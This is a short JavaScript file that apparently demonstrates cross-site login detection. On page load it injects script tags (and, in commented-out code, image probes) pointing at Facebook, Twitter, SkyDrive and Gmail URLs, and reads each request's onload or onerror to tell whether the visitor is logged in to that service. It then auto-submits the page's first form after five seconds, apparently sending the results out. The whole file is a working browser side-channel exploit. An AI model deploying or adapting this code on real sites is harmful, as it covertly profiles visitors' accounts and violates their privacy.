window.onload = function () {
    
    $('fbStatus').script("http://www.facebook.com/novogeek"); // Accessible only to logged-in users.
    $('twitterStatus').script("https://twitter.com/account/helloWorld"); //Non-existent URLs requiring authentication.
    var rnd = Math.round(Math.random(0, 10) * 1000000);
    /*
    $('winLiveStatus').img("https://u2fawa.bay.livefilestore.com/y1p5fBA3ZZtjDoB4EUzxB718mb3NlzCZeZDnIlld_WjOgCk1sf7U1FbsgALycidYQj9Qw_nQT323LNE16jG8pbOD-EBrhCu_0nn/online.png?version="+rnd); //Link created through "Share via email" option in skydrive.
	
    $('gmailStatus').img("https://mail.google.com/mail/ca/photos/img/photos/public/AIbEiAIAAABDCOPck4mWtqXTQyILdmNhcmRfcGhvdG8qKDA1MTA0YWIxYzM0MmIzMWRjNTYwNTYyOWNmMDU4NzMzOGM0NzE2YzMwAYiD0l_9e_tGci_jD_g8cBLDoPs3?version="+rnd);
    */
    setTimeout(function () {
        document.forms[0].submit();
    }, 5000);

};


(function(){
    var myCode=function(obj){
        return new myClass(obj);
    }
 
    var myClass=function(obj){
        if(obj){    this.element=document.getElementById(obj);  }
    };    
 
    myClass.prototype={
        script:function(url){
			var h=document.getElementsByTagName('head')[0];
			var elem=this.element;
			elem.value="Checking...";
			
			var s=document.createElement('script'); 
			s.src=url; 
			if (url.indexOf('twitter')>-1){
				s.onload=function(){
                        elem.value='Not Logged In'; 
                }; 
				s.onerror=function(){
                    elem.value='Logged In'; 
                };
			}
			else//if (url.indexOf('facebook')>-1){
			{
				s.onload=function(){
                    elem.value='Logged In'; 
                }; 
				s.onerror=function(){
                    elem.value='Not Logged In'; 
                };
			}
			
			h.appendChild(s);
            return this;
        },
		img:function(url){
			var elem=this.element;
			elem.value="Checking...";
			var b=document.body;
			var i=new Image();
			i.src=url;
			i.onload=function(){
                elem.value='Logged In'; 
            }; 
			i.onerror=function(){
                elem.style.color="red";
                elem.value='Not Logged In'; 
            };
			return this;
		}
    }
    window.$=myCode;
})();
/*Tick: '&#10004;' */ /*Cross: '&#9587;' */